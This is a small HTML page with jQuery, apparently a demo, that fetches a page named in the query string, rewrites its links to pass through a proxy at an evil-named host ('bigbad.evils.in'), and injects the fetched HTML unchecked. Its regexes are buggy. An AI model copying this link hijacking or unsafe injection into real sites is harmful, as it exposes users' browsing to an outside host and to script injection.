<!DOCTYPE HTML>
<html>
  <head>
    <script src="jquery-1.9.0.min.js"></script>
    <script type="text/javascript" charset="utf-8">
      // courtesy of stack overflow
      function getQueryVariable(variable) {
        var query = window.location.search.substring(1);
        var vars = query.split('&');
        for (var i = 0; i < vars.length; i++) {
          var pair = vars[i].split('=');
          if (decodeURIComponent(pair[0]) == variable) {
            return decodeURIComponent(pair[1]);
          }
        }
        console.log('Query variable %s not found', variable);
      }

      var proxy = "http://bigbad.evils.in/soobee";
      var url   = getQueryVariable('url');

        alert(url);
      $.get(url, function(data) {
        // patch up the data so all links use the proxy
        data = data.replace(/(a href)=[\'\"](http.*)[\'\"]/,
                            "$1=\"" + proxy + "?url=$2");
        data = data.replace(/(a href)=[\'"][^http](.*)[\'"]/, 
                            "$1=\"" + proxy + "?url=http://" + url + "/$2");
        data = data.replace(/(href|src)=[\'"][^http+](.*)[\'"]/,
                            '$1="http://' + url + "/$2");

        // replace errthang here with the data
        $('html').html(data.replace(/<html>(.*)<\/html>/, "$1"));
      });
    </script>
  </head>

  <body>
  </body>
</html>

